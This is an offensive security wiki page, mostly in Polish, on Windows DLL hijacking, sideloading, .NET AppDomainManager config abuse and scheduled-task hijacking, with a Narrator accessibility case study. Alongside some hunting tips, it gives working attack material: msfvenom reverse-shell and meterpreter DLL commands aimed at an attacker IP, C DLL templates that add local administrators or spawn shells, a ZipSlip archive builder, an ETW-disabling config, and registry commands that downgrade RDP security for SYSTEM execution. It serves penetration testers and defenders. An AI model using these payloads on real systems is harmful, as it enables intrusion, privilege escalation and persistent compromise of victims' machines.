# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking polega na manipulowaniu zaufaną aplikacją tak, aby załadowała złośliwy DLL. Termin ten obejmuje kilka technik, takich jak **DLL Spoofing, Injection i Side-Loading**. Jest to głównie wykorzystywane do code execution, uzyskania persistence oraz, rzadziej, privilege escalation. Mimo że tutaj skupiono się na escalation, sam sposób hijackingu pozostaje taki sam niezależnie od celu.

### Common Techniques

Wykorzystuje się kilka metod DLL hijacking, a każda z nich ma skuteczność zależną od strategii ładowania DLL przez aplikację:

1. **DLL Replacement**: Podmiana prawdziwego DLL na złośliwy, opcjonalnie z użyciem DLL Proxying, aby zachować funkcjonalność oryginalnego DLL.
2. **DLL Search Order Hijacking**: Umieszczenie złośliwego DLL na ścieżce wyszukiwania przed legalnym, wykorzystując wzorzec wyszukiwania aplikacji.
3. **Phantom DLL Hijacking**: Utworzenie złośliwego DLL, który aplikacja załaduje, myśląc, że jest to wymagany DLL, który nie istnieje.
4. **DLL Redirection**: Modyfikacja parametrów wyszukiwania, takich jak `%PATH%` lub plików `.exe.manifest` / `.exe.local`, aby skierować aplikację do złośliwego DLL.
5. **WinSxS DLL Replacement**: Podmiana legalnego DLL na złośliwy odpowiednik w katalogu WinSxS, metoda często kojarzona z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczenie złośliwego DLL w katalogu kontrolowanym przez użytkownika wraz z kopiowaną aplikacją, podobnie jak techniki Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klasyczny DLL sideloading nie jest jedynym sposobem, aby zmusić zaufany proces **.NET Framework** do załadowania kodu atakującego. Jeśli docelowy plik wykonywalny jest aplikacją **managed**, CLR sprawdza też **application configuration file** nazwany tak samo jak plik wykonywalny (na przykład `Setup.exe.config`). Taki plik może definiować niestandardowy **AppDomainManager**. Jeśli config wskazuje na assembly kontrolowane przez atakującego, umieszczone obok EXE, CLR ładuje je **przed normalną ścieżką kodu aplikacji** i uruchamia je wewnątrz zaufanego procesu.

Zgodnie ze schematem konfiguracji .NET Framework firmy Microsoft, zarówno `<appDomainManagerAssembly>`, jak i `<appDomainManagerType>` muszą być obecne, aby użyć niestandardowego managera.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimal manager:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Praktyczne uwagi:
- To jest taktyka specyficzna dla **.NET Framework**. Zależy od parsowania konfiguracji CLR, a nie od kolejności wyszukiwania DLL w Win32.
- Host musi naprawdę być **managed EXE**. Szybka triage: `sigcheck -m target.exe`, `corflags target.exe`, albo sprawdź **CLR Runtime Header** w metadanych PE.
- Nazwa pliku konfiguracyjnego musi dokładnie odpowiadać nazwie pliku wykonywalnego (`<binary>.config`) i zwykle znajduje się **obok EXE**.
- Jest to przydatne w przypadku **podpisanych binariów Microsoft/vendor**, ponieważ zaufany EXE pozostaje nietknięty, podczas gdy złośliwy managed assembly wykonuje się w tym samym procesie.
- Jeśli masz już zapisywalny katalog instalatora/update, AppDomainManager hijacking można wykorzystać jako **pierwszy etap**, a potem klasyczny DLL sideloading albo reflective loading dla kolejnych etapów.

### Hijacking istniejącego zaplanowanego zadania, aby ponownie uruchomić łańcuch sideloading

Dla persistence nie szukaj tylko **tworzenia nowego taska**. Niektóre intrusion sets czekają, aż legalny instalator utworzy **zwykłe updater task**, a następnie **przepisują action taska**, tak aby istniejąca nazwa, autor i trigger nadal wyglądały znajomo dla defenderów.

Wielokrotnego użytku workflow:
1. Zainstaluj/uruchom legalne oprogramowanie i zidentyfikuj task, który zwykle tworzy.
2. Wyeksportuj XML taska i zanotuj bieżące wartości `<Exec><Command>` / `<Arguments>`.
3. Zastąp tylko action, aby task uruchamiał twój **trusted host EXE** z katalogu staging, do którego użytkownik ma prawa zapisu, a który następnie side-loaduje albo AppDomain-loaduje właściwy payload.
4. Zarejestruj ponownie tę samą nazwę taska zamiast tworzyć nowy, oczywisty artefakt persistence.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Dlaczego jest to bardziej stealthy:
- Nazwa tasku nadal może wyglądać legalnie (na przykład jak updater vendora).
- **Task Scheduler service** uruchamia go, więc walidacja parent/ancestor często widzi oczekiwany łańcuch schedulingu zamiast `explorer.exe`.
- Zespoły DFIR, które polują tylko na **nowe nazwy tasków**, mogą przeoczyć task, którego rejestracja już istniała, ale którego action teraz wskazuje na `%LOCALAPPDATA%`, `%APPDATA%` albo inną ścieżkę kontrolowaną przez atakującego.

Szybkie punkty zaczepienia do huntingu:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Porównaj metadane XML z `C:\Windows\System32\Tasks\*` oraz `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` względem baseline.
- Alertuj, gdy **vendor-looking updater task** uruchamia się z **user-writable directories** albo odpala .NET EXE z lokalnym plikiem `*.config`.

> [!TIP]
> Po chain krok po kroku, który łączy HTML staging, konfiguracje AES-CTR i .NET implants na DLL sideloading, przejrzyj workflow poniżej.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Najczęstszy sposób na znalezienie brakujących Dlls w systemie to uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) z sysinternals, **ustawiając** **następujące 2 filtry**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

i pokazując tylko **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Jeśli szukasz **missing dlls ogólnie**, zostaw to uruchomione przez kilka **sekund**.\
Jeśli szukasz **missing dll w konkretnym executable**, powinieneś ustawić **inny filtr, np. "Process Name" "contains" `<exec name>`, uruchomić go i zatrzymać zbieranie eventów**.

## Exploiting Missing Dlls

Aby podnieść privileges, najlepszą szansą jest możliwość **zapisania dll, którą privileged process spróbuje załadować** w miejscu, w którym będzie jej szukał. Dzięki temu będziemy mogli **zapisać** dll w **folderze**, w którym **dll jest szukana wcześniej** niż folder z **oryginalną dll** (dziwny przypadek), albo będziemy mogli **zapisać** ją w jakimś folderze, w którym dll będzie szukana, a oryginalna **dll** nie istnieje w żadnym folderze.

### Dll Search Order

**W** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **możesz znaleźć, jak Dlls są ładowane w szczegółach.**

**Windows applications** szukają DLL-i według zestawu **pre-defined search paths**, zachowując określoną kolejność. Problem DLL hijacking pojawia się wtedy, gdy złośliwa DLL zostaje umieszczona strategicznie w jednym z tych katalogów, dzięki czemu zostanie załadowana przed autentyczną DLL. Sposobem na uniknięcie tego jest używanie przez aplikację absolutnych pathów przy odwoływaniu się do wymaganych DLL-i.

Poniżej możesz zobaczyć **DLL search order on 32-bit** systems:

1. Katalog, z którego aplikacja została załadowana.
2. Katalog systemowy. Użyj funkcji [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), aby uzyskać path do tego katalogu.(_C:\Windows\System32_)
3. 16-bit system directory. Nie ma funkcji, która pobiera path do tego katalogu, ale jest on przeszukiwany. (_C:\Windows\System_)
4. Windows directory. Użyj funkcji [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), aby uzyskać path do tego katalogu.
1. (_C:\Windows_)
5. Bieżący katalog.
6. Katalogi wymienione w zmiennej środowiskowej PATH. Zwróć uwagę, że nie obejmuje to per-application path wskazanego przez klucz rejestru **App Paths**. Klucz **App Paths** nie jest używany przy wyliczaniu DLL search path.

To jest **default** kolejność wyszukiwania z włączonym **SafeDllSearchMode**. Gdy jest wyłączony, bieżący katalog awansuje na drugie miejsce. Aby wyłączyć tę funkcję, utwórz wartość rejestru **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (default to enabled).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) jest wywołana z **LOAD_WITH_ALTERED_SEARCH_PATH**, wyszukiwanie zaczyna się w katalogu executable module, który ładuje **LoadLibraryEx**.

Na koniec pamiętaj, że **dll może zostać załadowana z podaniem absolute path zamiast samej nazwy**. W takim przypadku ta dll będzie **szukana tylko w tym path** (jeśli dll ma zależności, będą one wyszukiwane tak, jakby zostały załadowane tylko po nazwie).

Istnieją też inne sposoby modyfikowania kolejności wyszukiwania, ale nie będę ich tu wyjaśniał.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Użyj filtrów **ProcMon** (`Process Name` = target EXE, `Path` kończy się na `.dll`, `Result` = `NAME NOT FOUND`), aby zebrać nazwy DLL, których proces szuka, ale nie może znaleźć.
2. Jeśli binary działa na **schedule/service**, wrzucenie DLL o jednej z tych nazw do **application directory** (pozycja #1 w search-order) spowoduje jej załadowanie przy następnym uruchomieniu. W jednym przypadku .NET scanner process szukał `hostfxr.dll` w `C:\samples\app\` zanim załadował prawdziwą kopię z `C:\Program Files\dotnet\fxr\...`.
3. Zbuduj payload DLL (np. reverse shell) z dowolnym export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Jeśli twoim primitive jest **ZipSlip-style arbitrary write**, przygotuj ZIP, którego entry ucieka z extraction dir, tak aby DLL trafiła do folderu aplikacji:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Dostarcz archiwum do obserwowanej skrzynki odbiorczej/share; gdy zaplanowane zadanie ponownie uruchomi proces, załaduje złośliwy DLL i wykona twój kod jako konto usługi.

### Wymuszanie sideloading przez RTL_USER_PROCESS_PARAMETERS.DllPath

Zaawansowany sposób na deterministyczne wpływanie na ścieżkę wyszukiwania DLL nowo utworzonego procesu polega na ustawieniu pola DllPath w RTL_USER_PROCESS_PARAMETERS podczas tworzenia procesu za pomocą natywnych API ntdll. Podając tutaj katalog kontrolowany przez atakującego, można zmusić docelowy proces, który rozwiązuje importowany DLL po nazwie (bez bezwzględnej ścieżki i bez użycia bezpiecznych flag ładowania), do załadowania złośliwego DLL z tego katalogu.

Kluczowa idea
- Zbuduj parametry procesu za pomocą RtlCreateProcessParametersEx i podaj własny DllPath wskazujący na kontrolowany folder (np. katalog, w którym znajduje się twój dropper/unpacker).
- Utwórz proces za pomocą RtlCreateUserProcess. Gdy docelowy binarny plik rozwiązuje DLL po nazwie, loader uwzględni ten podany DllPath podczas rozwiązywania, co umożliwia niezawodny sideloading nawet wtedy, gdy złośliwy DLL nie znajduje się obok docelowego EXE.

Uwagi/ograniczenia
- Dotyczy to tworzonego procesu potomnego; różni się od SetDllDirectory, które wpływa tylko na bieżący proces.
- Cel musi importować lub wywoływać LoadLibrary dla DLL po nazwie (bez bezwzględnej ścieżki i bez użycia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i twardo zakodowane bezwzględne ścieżki nie mogą zostać przejęte. Forwarded exports i SxS mogą zmienić kolejność pierwszeństwa.

Minimalny przykład w C (ntdll, ciągi szerokie, uproszczona obsługa błędów):

<details>
<summary>Pełny przykład w C: wymuszanie sideloading DLL przez RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Przykład użycia operacyjnego
- Umieść złośliwy xmllite.dll (eksportujący wymagane funkcje albo proxy'ujący do prawdziwego) w katalogu DllPath.
- Uruchom podpisany binary, o którym wiadomo, że wyszukuje xmllite.dll po nazwie, używając powyższej techniki. Loader rozwiązuje import przez podany DllPath i sideloaduje Twój DLL.

Ta technika była obserwowana w praktyce jako napędzająca wieloetapowe łańcuchy sideloading: początkowy launcher wrzuca helper DLL, który następnie uruchamia podpisany przez Microsoft, podatny na hijack binary z niestandardowym DllPath, aby wymusić załadowanie DLL atakującego z katalogu staging.


### .NET AppDomainManager hijacking via `.exe.config`

Dla celów **.NET Framework** sideloading można wykonać **przed `Main()`** bez patchowania pamięci, nadużywając sąsiedniego pliku **`.exe.config`** aplikacji. Zamiast polegać wyłącznie na kolejności wyszukiwania DLL w Win32, atakujący umieszcza legalny .NET EXE obok złośliwego configu i jednej lub więcej kontrolowanych przez atakującego assembly.

Jak działa ten łańcuch:
1. Host EXE startuje i **CLR czyta `<exe>.config`**.
2. Config ustawia **`<appDomainManagerAssembly>`** oraz **`<appDomainManagerType>`**, dzięki czemu runtime instancjonuje kontrolowany przez atakującego `AppDomainManager`.
3. Złośliwy manager dostaje **wykonanie przed `Main()`** wewnątrz zaufanego procesu hosta.
4. Ten sam config może wymusić, aby CLR najpierw rozwiązywał lokalne assembly (na przykład `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) oraz może osłabić walidację runtime/telemetrię bez inline patching.

Wzorzec w stylu kampanii (dokładne zagnieżdżenie może się różnić w zależności od directive / wersji CLR):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Dlaczego to jest przydatne:
- **`<probing privatePath="."/>`** utrzymuje rozwiązywanie assembly w katalogu aplikacji, zamieniając folder w przewidywalną powierzchnię sideloading.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** przenoszą wykonanie do kodu atakującego podczas inicjalizacji CLR, zanim uruchomi się legalna logika aplikacji.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** może pozwolić aplikacji full-trust załadować niepodpisane lub zmodyfikowane assembly bez błędu walidacji strong-name.
- **`<publisherPolicy apply="no"/>`** unika przekierowań publisher-policy do nowszych assembly.
- **`<requiredRuntime ... safemode="true"/>`** sprawia, że wybór runtime jest bardziej deterministyczny.
- **`<etwEnable enabled="false"/>`** jest szczególnie interesujące, ponieważ **CLR wyłącza własną widoczność ETW** z konfiguracji zamiast tego, by implant patchował `EtwEventWrite` w pamięci.

Wzorzec operacyjny widziany w ostatnich kampaniach:
- Etap 1 upuszcza `setup.exe`, `setup.exe.config` i lokalne assembly.
- Etap 2 kopiuje je do wiarygodnie wyglądającego folderu **AppData update**, zmienia nazwę hosta na coś w stylu `update.exe` i uruchamia go ponownie przez **scheduled task**.
- Etap 3 weryfikuje kontekst wykonania (na przykład oczekiwany parent `svchost.exe` od Task Scheduler) przed załadowaniem końcowego DLL/export RAT.

Pomysły na hunting:
- Podpisane lub w inny sposób legalne **.NET executables** uruchamiane z podejrzanymi sąsiadującymi plikami **`.config`** w lokalizacjach zapisywalnych przez użytkownika.
- Pliki `.config` zawierające **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** albo **`etwEnable enabled="false"`**.
- Scheduled tasks, które ponownie uruchamiają przemianowane pliki update z **`%LOCALAPPDATA%`** lub z katalogów specyficznych dla aplikacji `\bin\update\`.
- Łańcuchy parent/child, w których scheduled task uruchamia zaufany host .NET, który natychmiast ładuje niepochodzące od vendora assembly z własnego katalogu.

#### Wyjątki w kolejności wyszukiwania dll z dokumentacji Windows

W dokumentacji Windows odnotowano pewne wyjątki od standardowej kolejności wyszukiwania DLL:

- Gdy napotkany zostanie **DLL, który ma taką samą nazwę jak już załadowany do pamięci**, system omija zwykłe wyszukiwanie. Zamiast tego sprawdza przekierowanie i manifest, a dopiero potem domyślnie używa DLL już znajdującego się w pamięci. **W tym scenariuszu system nie wykonuje wyszukiwania DLL**.
- W przypadkach, gdy DLL jest rozpoznany jako **known DLL** dla bieżącej wersji Windows, system użyje swojej wersji znanego DLL, wraz z zależnymi od niego DLL, **pomijając proces wyszukiwania**. Klucz rejestru **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** zawiera listę tych known DLL.
- Jeśli **DLL ma zależności**, wyszukiwanie tych zależnych DLL odbywa się tak, jakby były wskazane wyłącznie przez swoje **nazwy modułów**, niezależnie od tego, czy początkowy DLL został zidentyfikowany przez pełną ścieżkę.

### Eskalacja uprawnień

**Wymagania**:

- Zidentyfikuj proces, który działa lub będzie działał z **innymi uprawnieniami** (horizontal lub lateral movement), i który **nie ma DLL**.
- Upewnij się, że dostępny jest **zapis** do dowolnego **katalogu**, w którym **DLL** będzie **wyszukiwany**. Może to być katalog pliku wykonywalnego albo katalog w system path.

Tak, wymagania są skomplikowane do znalezienia, bo **domyślnie dość dziwne jest znalezienie uprzywilejowanego executables bez dll** i jeszcze **bardziej dziwne jest mieć uprawnienia zapisu do folderu w system path** (domyślnie się nie da). Ale w źle skonfigurowanych środowiskach jest to możliwe.\
Jeśli masz szczęście i spełniasz wymagania, możesz sprawdzić projekt [UACME](https://github.com/hfiref0x/UACME). Nawet jeśli **głównym celem projektu jest bypass UAC**, możesz tam znaleźć **PoC** Dll hijaking dla wersji Windows, której możesz użyć (prawdopodobnie wystarczy tylko zmienić ścieżkę folderu, do którego masz uprawnienia zapisu).

Zwróć uwagę, że możesz **sprawdzić swoje uprawnienia w folderze** robiąc:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **sprawdź uprawnienia wszystkich folderów w PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Możesz także sprawdzić importy pliku wykonywalnego i eksporty dll za pomocą:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Other interesting automated tools to discover this vulnerability are **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Example

In case you find an exploitable scenario one of the most important things to successfully exploit it would be to **create a dll that exports at least all the functions the executable will import from it**. Anyway, note that Dll Hijacking comes handy in order to [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Moreover, in the **next sectio**n you can find some **basic dll codes** that might be useful as **templates** or to create a **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basically a **Dll proxy** is a Dll capable of **execute your malicious code when loaded** but also to **expose** and **work** as **exected** by **relaying all the calls to the real library**.

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Uzyskaj meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Utwórz użytkownika (x86 nie widziałem wersji x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Twoje własne

Zauważ, że w kilku przypadkach Dll, którą kompilujesz, musi **eksportować kilka funkcji**, które zostaną załadowane przez proces ofiary. Jeśli te funkcje nie istnieją, **binary nie będzie mógł ich załadować** i **exploit zakończy się niepowodzeniem**.

<details>
<summary>Szablon C DLL (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Przykład DLL w C++ z tworzeniem użytkownika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatywna DLL w C z entry thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studium przypadku: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe nadal sprawdza przy starcie przewidywalny, specyficzny dla języka localization DLL, który można przejąć dla arbitrary code execution i persistence.

Kluczowe fakty
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Jeśli istnieje zapisywalny DLL kontrolowany przez attacker pod ścieżką OneCore, jest on ładowany i wykonuje się `DllMain(DLL_PROCESS_ATTACH)`. Nie są wymagane żadne exports.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Uruchom Narrator i obserwuj próbę załadowania powyższej ścieżki.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC cisza
- Naiwny hijack będzie mówił/podświetlał UI. Aby pozostać cicho, po attach wylicz thready Narrator, otwórz główny thread (`OpenThread(THREAD_SUSPEND_RESUME)`) i użyj `SuspendThread`; kontynuuj we własnym threadzie. Zobacz PoC po pełny kod.

Trigger i persistence przez konfigurację Accessibility
- Kontekst użytkownika (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Przy powyższym uruchomienie Narrator ładuje podłożony DLL. Na secure desktop (logon screen) naciśnij CTRL+WIN+ENTER, aby uruchomić Narrator; twój DLL wykona się jako SYSTEM na secure desktop.

Wykonanie SYSTEM wyzwalane przez RDP (lateral movement)
- Zezwól na klasyczną warstwę bezpieczeństwa RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Połącz się przez RDP z hostem, na logon screen naciśnij CTRL+WIN+ENTER, aby uruchomić Narrator; twój DLL wykona się jako SYSTEM na secure desktop.
- Wykonanie zatrzymuje się, gdy sesja RDP zostanie zamknięta—szybko wykonaj inject/migrate.

Bring Your Own Accessibility (BYOA)
- Możesz sklonować wpis rejestru wbudowanego Accessibility Tool (AT) (np. CursorIndicator), zmienić go tak, aby wskazywał na dowolny binary/DLL, zaimportować go, a potem ustawić `configuration` na nazwę tego AT. To pośredniczy w arbitralnym wykonaniu pod frameworkiem Accessibility.

Uwagi
- Zapis do `%windir%\System32` i zmiana wartości HKLM wymaga uprawnień admin.
- Cała logika payload może działać w `DLL_PROCESS_ATTACH`; eksporty nie są potrzebne.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Ten case study pokazuje **Phantom DLL Hijacking** w Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), śledzone jako **CVE-2025-1729**.

### Szczegóły podatności

- **Komponent**: `TPQMAssistant.exe` znajdujący się w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` uruchamia się codziennie o 9:30 AM w kontekście zalogowanego użytkownika.
